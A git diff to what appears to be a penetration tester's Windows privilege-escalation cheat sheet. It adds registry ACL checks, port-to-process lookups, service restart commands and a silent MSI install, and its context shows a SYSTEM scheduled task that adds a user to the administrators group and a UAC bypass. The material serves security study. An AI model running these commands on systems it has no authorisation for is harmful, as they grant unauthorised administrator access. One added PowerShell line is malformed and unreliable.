@@ -1,5 +1,7 @@
 # Windows Privilege Escalation
 
+I just found the craziest cheat code. Don't want to post it here till I know more but reach out.
+
 ### Initial Access
 
 There are several key pieces of information we should always obtain:
@@ -216,6 +218,7 @@ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
 accesschk.exe -qdws Users C:\Windows\ /accepteula
 accesschk.exe -wuvc daclsvc /accepteula
+accesschk.exe /accepteula "harey" -kvuqsw hklm\System\CurrentControlSet\services # Checking for weak service ACLs in the Registry
 ```
 
 ### PowerShell Scripts
@@ -368,7 +371,17 @@ Simple way to get more information about files in directory, such as who owns th
 dir /a /o /q
 ```
 
-#### Check What Process is Running on a Port
+#### Investigate Process
+
+```bash
+get-nettcpconnection | select local*,remote*,state,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}
+Get-NetTCPConnection | Where-Object { $_.State -eq "LISTEN" } | select @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName)}, 127.0.0.1, 8000
+Get-Process -Id (Get-NetTCPConnection -LocalPort 8000).OwningProcess
+Get-Process -Id (Get-NetUDPEndpoint -LocalPort 8000).OwningProcess
+netstat -a -b
+```
+
+Check What Process is Running on a Port.
 
 ```bash
 Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | Get-Process
@@ -1093,12 +1106,14 @@ sc query | findstr /i "SQLSERVERAGENT"
 sc qc <ServiceName> | findstr /i "BINARY_PATH_NAME"
 net stop <ServiceName> && net start <ServiceName>
 sc stop <ServiceName> && sc start <ServiceName>
+sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
+whoami /priv #if the above failed check to see if you have shutdown privledges
 stop-Service <ServiceName>
 Start-Service <ServiceName>
 Start-Process <ServiceName>
 Stop-Process <ServiceName>
 Restart-Service <ServiceName>
-shutdown /r /t 0 /f
+shutdown /r /t 0 /f # force that bih
 # as alternative
 shutdown -r -t 1 /f
 # powershell
@@ -1356,7 +1371,7 @@ Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 
-IF YOU CAN WRITE TO A BAT FILE BEING EXECUTED BY A SCHEDULED TASK ->
+#### IF YOU CAN WRITE TO A BAT FILE BEING EXECUTED BY A SCHEDULED TASK ->
 
 ```bash
 schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
@@ -2320,4 +2335,10 @@ Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;. .\UACBypass.ps1
 
 ```bash
 echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: & type "C:\Users\Administrator\Desktop\proof.txt" 2> nul & type "C:\Documents and Settings\Administrator\Desktop\proof.txt" 2> nul & type %USERPROFILE%\Desktop\proof.txt 2> null
+```
+
+#### Executing MSI Package
+
+```bash
+msiexec /i c:\users\smelly\desktop\aie.msi /quiet /qn /norestart
 ```
